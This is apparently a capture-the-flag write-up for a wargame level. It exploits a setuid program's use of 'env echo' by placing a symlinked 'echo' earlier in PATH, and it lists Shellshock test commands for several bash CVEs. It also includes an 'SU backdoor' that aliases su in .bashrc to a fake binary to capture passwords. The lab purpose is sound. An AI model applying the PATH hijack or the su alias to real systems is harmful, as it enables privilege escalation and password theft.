# level01

#### About

There is a vulnerability in the below program that allows arbitrary programs to be executed, can you find it?

To do this level, log in as the level01 account with the password level01. Files for this level can be found in /home/flag01.


#### Source code
```
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <stdio.h>

int main(int argc, char **argv, char **envp)
{
	gid_t gid;
	uid_t uid;
	gid = getegid();
	uid = geteuid();

	setresgid(gid, gid, gid);
	setresuid(uid, uid, uid);

	system("/usr/bin/env echo and now what?");
}
```

#### Solutions
```
cd /home/level01/
export PATH=/home/level01:$PATH
ln -s /bin/getflag /home/level01/echo
/home/flag01/flag01
```

#### SU backdoor
```
vim ~/.bashrc
++ alias su=/tmp/su_backdoor
su 
Password:
```

#### Recommend

env 
    env [OPTION]... [NAME=VALUE] [COMMAND [ARGS]...] 

让命令在已修改的环境变量下运行。'VARIABLE=VALUE' 设置环境变量VARIABLE的  
值为VALUE. VALUE的值可以为空，将变量的值设为空，并不等同于移除声明的变  
量.整个执行顺序: 从左到右，如果两次声明的是同一变量，则第一个声明会被第  
二个覆盖.  
如果未指定env后面的命令，将输出环境变量，类似执行了'printenv'程序.  
 
0    ---- if no COMMAND is specified and the environment is output.  
125  ---- if `env' itself fails  
126  ---- if COMMAND is found but cannot be invoked  
127  ---- if COMMAND cannont be found  
the exit status of COMMAND otherwise  


source 
    source filename [arguments]  

source 命令，可以将加载文件中的函数，到当前shell脚本或命令行环境.  
source 命令，可以强制让一个脚本去影响当前的环境，export则只能影响其子环境.  
例如:   
    source ~/.bashrc 等效于 ~/.bashrc  

   
BASH shellshock  


CVE-2014-6271  

    env X='() { :; }; echo "CVE-2014-6271 vulnerable"' bash -c id  

CVE-2014-6277  

    will segfault if vulnerable  

    env X='() { x() { _; }; x() { _; } <<a; }' bash -c :  
    Additional discussion on fulldisclosure: http://seclists.org/fulldisclosure/2014/Oct/9  
    Additional information: http://lcamtuf.blogspot.com/2014/10/bash-bug-how-we-finally-cracked.html  

CVE-2014-6278  

    env X='() { _; } >_[$($())] { echo CVE-2014-6278 vulnerable; id; }' bash -c :  
    Additional information: http://lcamtuf.blogspot.com/2014/10/bash-bug-how-we-finally-cracked.html  

CVE-2014-7169  

    will create a file named echo in cwd with date in it, if vulnerable  

    env X='() { (a)=>\' bash -c "echo date"; cat echo  

CVE-2014-7186  

    bash -c 'true <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF' || echo "CVE-2014-7186 vulnerable, redir_stack"  

CVE-2014-7187  

    (for x in {1..200} ; do echo "for x$x in ; do :"; done; for x in {1..200} ; do echo done ; done) | bash || echo "CVE-2014-7187 vulnerable, word_lineno"  

